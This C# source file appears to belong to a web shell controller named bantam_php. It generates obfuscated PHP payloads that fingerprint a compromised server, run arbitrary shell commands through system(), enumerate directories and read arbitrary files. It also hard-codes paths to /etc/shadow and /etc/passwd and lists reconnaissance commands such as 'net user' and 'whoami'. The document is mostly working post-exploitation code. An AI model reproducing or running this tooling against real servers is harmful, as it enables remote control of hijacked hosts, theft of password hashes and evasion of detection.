using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace bantam_php
{
    class PhpHelper
    {
        /// <summary>
        /// 
        /// </summary>
        public enum INIT_DATA_VARS
        {
            OS = 0,
            CWD,
            FREE_SPACE,
            TOTAL_SPACE,
            RELEASE,
            KERNEL,
            SERVER_IP,
            SERVER_SOFTWARE,
            USER,
            UID,
            GID,
            GROUP,
            PHP_VERSION
        }

        /// <summary>
        /// 
        /// </summary>
        public const string rowSeperator = "|=$=|";

        /// <summary>
        /// 
        /// </summary>
        public const string colSeperator = ",.$.,";

        /// <summary>
        /// Linux File Locations
        /// </summary>
        public static string linuxFS_ShadowFile         = "/etc/shadow";
        public static string linuxFS_PasswdFile         = "/etc/passwd";
        public static string linuxFS_IssueFile          = "/etc/issue.net";
        public static string linuxFS_hostTargetsFile    = "/etc/hosts";
        public static string linuxFS_ProcVersion        = "/proc/version";
        public static string linuxFS_NetworkInterfaces  = "/etc/network/interfaces";

        /// <summary>
        /// Windows File Locations
        /// </summary>
        public static string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";

        /// <summary>
        /// OS Commands
        /// </summary>
        public static string linuxOS_PsAux          = "ps aux";
        public static string linuxOS_Ifconfig       = "ifconfig";
        public static string windowsOS_Ipconfig     = "ipconfig";
        public static string windowsOS_TaskList     = "tasklist";
        public static string windowsOS_NetUser      = "net user";
        public static string windowsOS_NetAccounts  = "net accounts";
        public static string windowsOS_Ver          = "ver";
        public static string posixOS_Whoami         = "whoami";

        public static void ShuffleList<T>(IList<T> list)
        {
            Random random = new Random();
            int n = list.Count;

            for (int i = list.Count - 1; i > 1; i--) {
                int rnd = random.Next(i + 1);

                T value = list[rnd];
                list[rnd] = list[i];
                list[i] = value;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// 
        public static string InitShellData(bool encryptResponse)
        {
            string osVar = EncryptionHelper.RandomPHPVar();
            string cwdVar = EncryptionHelper.RandomPHPVar();
            string freespaceVar = EncryptionHelper.RandomPHPVar();
            string totalfreespaceVar = EncryptionHelper.RandomPHPVar();
            string releaseVar = EncryptionHelper.RandomPHPVar();
            string kernelVar = EncryptionHelper.RandomPHPVar();
            string serverIpVar = EncryptionHelper.RandomPHPVar();
            string serverSoftwareVar = EncryptionHelper.RandomPHPVar();
            string userVar = EncryptionHelper.RandomPHPVar();
            string uidVar = EncryptionHelper.RandomPHPVar();
            string gidVar = EncryptionHelper.RandomPHPVar();
            string groupVar = EncryptionHelper.RandomPHPVar();
            string phpVersionVar = EncryptionHelper.RandomPHPVar();

            string responseCode = string.Empty;
            string linesRandomized = string.Empty;

            List<string> lines = new List<string> {
                osVar + " = 'nix'; if (strtolower(substr(PHP_OS, 0, 3)) == 'win'){ " + osVar + " = 'win';}",
                freespaceVar + " = @diskfreespace(" + cwdVar + ");",
                cwdVar + " = dirname(__FILE__);",
                totalfreespaceVar + " = @disk_total_space(" + cwdVar + ");",
                totalfreespaceVar + " = " + totalfreespaceVar + " ? " + totalfreespaceVar + " : 1;",
                releaseVar + " = @php_uname('r');",
                kernelVar + " = @php_uname('s');",
                serverIpVar + " = $_SERVER['SERVER_ADDR'];",
                serverSoftwareVar + " = @getenv('SERVER_SOFTWARE');",
                phpVersionVar + @" = phpversion();"
            };

            ShuffleList(lines);
            //lines.ShuffleList();

            if (encryptResponse) {
                responseCode = "$result = " + osVar + ".'" + colSeperator
                     + "'." + cwdVar + ".'" + colSeperator
                     + "'." + freespaceVar + ".'" + colSeperator
                     + "'." + totalfreespaceVar + ".'" + colSeperator
                     + "'." + releaseVar + ".'" + colSeperator
                     + "'."+ kernelVar + ".'" + colSeperator
                     + "'." + serverIpVar + ".'" + colSeperator
                     + "'."+ serverSoftwareVar + ".'" + colSeperator
                     + "'."+ userVar + ".'" + colSeperator
                     + "'."+ uidVar + ".'" + colSeperator
                     + "'."+ gidVar + ".'" + colSeperator
                     + "'."+ groupVar + ".'" + colSeperator
                     + "'."+ phpVersionVar + ";";
            } else {
                responseCode = "echo " + osVar + ".'" + colSeperator
                     + "'." + cwdVar + ".'" + colSeperator
                     + "'." + freespaceVar + ".'" + colSeperator
                     + "'." + totalfreespaceVar + ".'" + colSeperator
                     + "'." + releaseVar + ".'" + colSeperator
                     + "'."+ kernelVar + ".'" + colSeperator
                     + "'."+ serverIpVar + ".'" + colSeperator
                     + "'."+ serverSoftwareVar + ".'" + colSeperator
                     + "'."+ userVar + ".'" + colSeperator
                     + "'."+ uidVar + ".'" + colSeperator
                     + "'."+ gidVar + ".'" + colSeperator
                     + "'."+ groupVar + ".'" + colSeperator
                    + "'."+ phpVersionVar + ";";
            }

            foreach(var line in lines) {
                linesRandomized += line;
            }
          
            return linesRandomized + "if (!function_exists('posix_getegid')) {"
	                + userVar + " = @get_current_user();"
	                + uidVar + " = @getmyuid();"
	                + gidVar + " = @getmygid();"
	                + groupVar + @" = '?';
                } else {
	                "+ uidVar + " = @posix_getpwuid(posix_geteuid());"
	                + gidVar + " = @posix_getgrgid(posix_getegid());"
	                + userVar + "= "+ uidVar + "['name'];"
	                + uidVar + " = "+ uidVar + "['uid'];"
	                + gidVar + " = "+ gidVar + "['gid'];"
	                + groupVar + " = "+ gidVar + @"['name'];
                }" + responseCode;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string PhpInfo(bool encryptResponse)
        {
            if (encryptResponse) {
                return "@ob_start(); @phpinfo(); $result = @ob_get_contents(); @ob_end_clean();";
            } else {
                return "phpinfo();";
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="encryptReponse"></param>
        /// <returns></returns>
        public static string PhpTestExecutionWithEcho(bool encryptReponse)
        {
            string phpTestExecutionWithEcho = string.Empty;
            if (encryptReponse) {
                phpTestExecutionWithEcho = "$result = '1';";

            } else {
                phpTestExecutionWithEcho = "echo '1';";
            }
            return phpTestExecutionWithEcho;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string OsDetectPhp(bool encryptResponse)
        {
            string osDetectPHP = string.Empty;
            if (encryptResponse) {
                osDetectPHP = "$result; if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $result = 'win'; } else { $result = 'nix'; }";
            } else {
                osDetectPHP = "if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ echo 'win'; } else { echo 'nix'; }";
            }
            return osDetectPHP;
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string GetHardDriveLettersPhp(bool encryptResponse)
        {
            string getHardDriveLetters = string.Empty;
            string driveVar = EncryptionHelper.RandomPHPVar();

            if (encryptResponse) {
                getHardDriveLetters = "$result; foreach (range('a', 'z') as " + driveVar + ") { if (is_dir(" + driveVar + " . ':\\')) { $result .= " + driveVar + ".':|'; }}";
            } else {
                getHardDriveLetters = "foreach (range('a', 'z') as " + driveVar + ") { if (is_dir(" + driveVar + " . ':\\')) { echo " + driveVar + ".':|'; }}";
            }
            return getHardDriveLetters;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="fileName"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ReadFileProcedure(string fileName, bool encryptResponse)
        {
            if (encryptResponse) {
                return @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
            } else {
                return "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
            }
        }

        /// <summary>
        /// Todo make a user controlled feature as to which function to use, but also use this and call it the something something method
        /// </summary>
        /// <param name="code"></param>
        /// <returns></returns>
        //    public static string executeSystemCode(string code)
        //    {
        //  return @"
        //        if (function_exists('exec')) {
        //            @exec($in, $out);
        //   echo @out;
        //        } elseif(function_exists('passthru')) {
        //            @passthru($in);
        //        } elseif(function_exists('system')) {
        //            @system($in);;
        //        } elseif(function_exists('shell_exec')) {
        //   echo @shell_exec($in);
        //        } elseif(is_resource($f = @popen($in, 'r'))) {
        //   $out = "";
        //            while (!@feof($f))
        //$out .= fread($f, 1024);
        //            pclose($f);
        //            echo $out;
        //        }";
        //    }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="code"></param>
        /// <param name="encryptResponse"></param>
        /// <returns></returns>
        public static string ExecuteSystemCode(string code, bool encryptResponse)
        {
            if (encryptResponse) {
                return "@ob_start(); @system('" + code + "'); $result = @ob_get_contents(); @ob_end_clean();";
            } else {
                return "@system('" + code + "');";
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="location"></param>
        /// <param name="phpVersion"></param>
        /// <returns></returns>
        public static string DirectoryEnumerationCode(string location, string phpVersion, bool responseEncryption)
        {
            string varItem = EncryptionHelper.RandomPHPVar();
            string varFile = EncryptionHelper.RandomPHPVar();

            if (responseEncryption) {
                return @"$result; function PermsColor(" + varFile + @") {
		            if (!@is_readable(" + varFile + @")) {
			            return 'red';
		            } elseif (!@is_writable(" + varFile + @")) {
			            return 'grey';
		            } else {
			            return 'green';
                    }
	            }
                try{ 
                    foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {
			            $result .= " + varItem + "->getBasename().'" + colSeperator + "'."
                                     + varItem + "->getPath().'" + colSeperator + "'."
                                     + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + colSeperator + "'."
                                     + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + colSeperator + "'."
                                     + "PermsColor(" + varItem + @"->getPathname()).'" + rowSeperator + @"';
		            }
                }catch(Exception $e){  }";
            } else {
                return @"function PermsColor(" + varFile + @") {
		            if (!@is_readable(" + varFile + @")) {
			            return 'red';
		            } elseif (!@is_writable(" + varFile + @")) {
			            return 'grey';
		            } else {
			            return 'green';
                    }
	            }
                try{ 
                    foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {
			            echo " + varItem + "->getBasename().'" + colSeperator + "'."
                               + varItem + "->getPath().'" + colSeperator + "'."
                               + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + colSeperator + "'."
                               + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + colSeperator + "'."
                               + "PermsColor(" + varItem + @"->getPathname()).'" + rowSeperator + @"';
		            }
                }catch(Exception $e){  }";
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="windowsOS"></param>
        /// <returns></returns>
        public static string TaskListFunction(bool windowsOS = true)
        {
            return (windowsOS) ? windowsOS_TaskList : linuxOS_PsAux;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="code"></param>
        /// <returns></returns>
        public static string MinifyCode(string code)
        {
            string clean = Regex.Replace(code, @"\t|\n|\r", string.Empty);
            string clean2 = Regex.Replace(clean, @"[^\u0000-\u007F]+", string.Empty);
            return Regex.Replace(clean2, @"\s+", " ");
        }
    }
}
